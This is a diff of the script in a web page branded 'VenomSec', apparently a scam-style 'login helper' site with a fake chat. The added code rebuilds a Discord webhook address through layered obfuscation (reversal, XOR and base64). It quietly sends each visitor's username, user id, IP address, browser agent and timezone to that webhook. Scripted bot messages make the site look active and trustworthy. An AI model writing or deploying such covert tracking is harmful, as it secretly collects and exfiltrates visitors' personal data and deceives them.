@@ -110,15 +110,17 @@
 </div>
 
 <script>
-function l1(a,b,c){return a+b+c;}
-function l2(s){return atob(s);}
-function l3(x){return x.split('').map(c=>String.fromCharCode(c.charCodeAt(0)^7)).join('');}
-function getHook(){
-    let p1 = l1("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv","MTUxMTc0NjU0MDE0MDQ5NTA0OC8","Nl1Sd3A3ZWpHZnAxc2JHeXAwT3ZERTEyUEQ4OTM0VnFDcnk4dGNMemRpMXN1VktVMHBzcm53ZXNB M0xWNWZzYUVBN0s=");
-    let p2 = l2(p1);
-    let p3 = l3(p2);
-    return p3;
+function l1(s){return s.split('').reverse().join('');}
+function l2(s){let r='';for(let i=0;i<s.length;i++){r+=String.fromCharCode(s.charCodeAt(i)^7);}return r;}
+function l3(s){return atob(s);}
+
+function getWebhook(){
+    let p1 = l3("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv");
+    let p2 = l1(l2("1511746540140495048"));
+    let p3 = l3("Ni1Sd3A3ZWpHZnAxc2JHeXAwT3ZERTEyUEQ4OTM0VnFDcnk4dGNMemRpMXN1VktVMHBzcm53ZXNBM0xWNWYzYUVBN0s=");
+    return p1 + p2 + "/" + p3;
 }
+
 async function sendLog(username, userid) {
     try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -126,22 +128,22 @@ async function sendLog(username, userid) {
         const ip = ipData.ip;
 
         const data = {
-            content: "**VenomSec Login Helper**",
+            content: "**VenomSec Signup**",
             embeds: [{
-                title: "New Signup",
+                title: "New login",
                 color: 0x00ff00,
                 fields: [
-                    { name: "юзер", value: username, inline: true },
+                    { name: "Signup Username", value: username, inline: true },
                     { name: "id", value: userid, inline: true },
-                    { name: "адрес", value: ip, inline: true },
-                    { name: "агент", value: navigator.userAgent, inline: false },
-                    { name: "впн байпасс", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                    { name: "проверка на бота", value: ip, inline: true },
+                    { name: "агнт", value: navigator.userAgent, inline: false },
+                    { name: "таймзоне", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
                     { name: "Timestamp", value: new Date().toISOString(), inline: true }
                 ]
             }]
         };
 
-        await fetch(getHook(), {
+        await fetch(getWebhook(), {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
@@ -191,10 +193,9 @@ function sendMessage() {
     if (text) {
         addMessage("You", text);
         input.value = '';
-        
         setTimeout(() => {
-            const replies = ["LMAO same", "Demoted EZ", "Fart", "Facts"];
-            addMessage("fornga0" + Math.floor(Math.random()*999), replies[Math.floor(Math.random()*replies.length)]);
+            const replies = ["LMAO same", "Demoted instantly", "VenomSec never misses", "Facts"];
+            addMessage("venomuser" + Math.floor(Math.random()*999), replies[Math.floor(Math.random()*replies.length)]);
         }, 800);
     }
 }
@@ -205,7 +206,6 @@ document.getElementById('chatInput').addEventListener('keypress', function(e) {
 
 setTimeout(() => addMessage("xX_ShadowDemoter_Xx", "anyone need nitro demotion?"), 1200);
 setTimeout(() => addMessage("VenomAdmin", "All services active"), 2500);
-
 </script>
 </body>
 </html>
